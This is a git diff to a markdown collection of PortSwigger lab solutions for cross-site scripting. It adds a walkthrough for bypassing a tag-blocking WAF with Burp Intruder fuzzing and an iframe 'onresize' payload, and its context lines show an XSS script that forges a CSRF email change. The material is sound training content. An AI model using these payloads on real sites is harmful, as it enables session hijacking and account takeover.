@@ -17,6 +17,7 @@
 - [Exploiting cross-site scripting to steal cookies](#exploiting-cross-site-scripting-to-steal-cookies)
 - [Exploiting cross-site scripting to capture passwords](#exploiting-cross-site-scripting-to-capture-passwords)
 - [Exploiting XSS to perform CSRF](#exploiting-xss-to-perform-csrf)
+- [Reflected XSS into HTML context with most tags and attributes blocked](#reflected-xss-into-html-context-with-most-tags-and-attributes-blocked)
 
 ## Reflected XSS into HTML context with nothing encoded
 Reference: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
@@ -232,7 +233,7 @@ As stated in the description of the lab there is an XSS vulnerability in the com
  - There's an anti-CSRF token in a hidden input called token.
 This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.
 3. Submit the following payload in a blog comment:
-```
+```javascript
 <script>
 var req = new XMLHttpRequest();
 req.onload = handleResponse;
@@ -247,3 +248,31 @@ function handleResponse() {
 </script>
 ```
 This will make anyone who views the comment issue a POST request to change their email address to ``test@test.com``.
+
+## Reflected XSS into HTML context with most tags and attributes blocked
+Reference: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
+
+<!-- omit in toc -->
+### Quick Solution
+There is a *WAF* to protect the website from XSS. This firewall blocks HTML tags in the search functionality. The easiest way to reach the solution is to test every tag in the *cheatsheet* and see which one works. Payload in the next section.
+
+<!-- omit in toc -->
+### Solution
+1. Inject a standard XSS vector, such as: ``<img src=1 onerror=print()>``
+2. Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.
+3. With your browser proxying traffic through Burp Suite, use the search function in the lab. Send the resulting request to Burp Intruder.
+4. In Burp Intruder, in the Positions tab, click "Clear §". Replace the value of the search term with: ``<>``
+5. Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: ``<§§>``
+6. Visit the XSS cheat sheet and click "Copy tags to clipboard".
+7. In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".
+8. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the ``body`` payload, which caused a 200 response.
+9. Go back to the Positions tab in Burp Intruder and replace your search term with: ``<body%20=1>``
+10. Place the cursor before the = character and click "Add §" twice, to create a payload position. The value of the search term should now look like: ``<body%20§§=1>``
+11. Visit the XSS cheat sheet and click "copy events to clipboard".
+12. In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the payloads list. Click "Start attack".
+13. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the onresize payload, which caused a 200 response.
+14. Go to the exploit server and paste the following code, replacing your-lab-id with your lab ID:
+```
+<iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```
+15. Click "Store" and "Deliver exploit to victim".
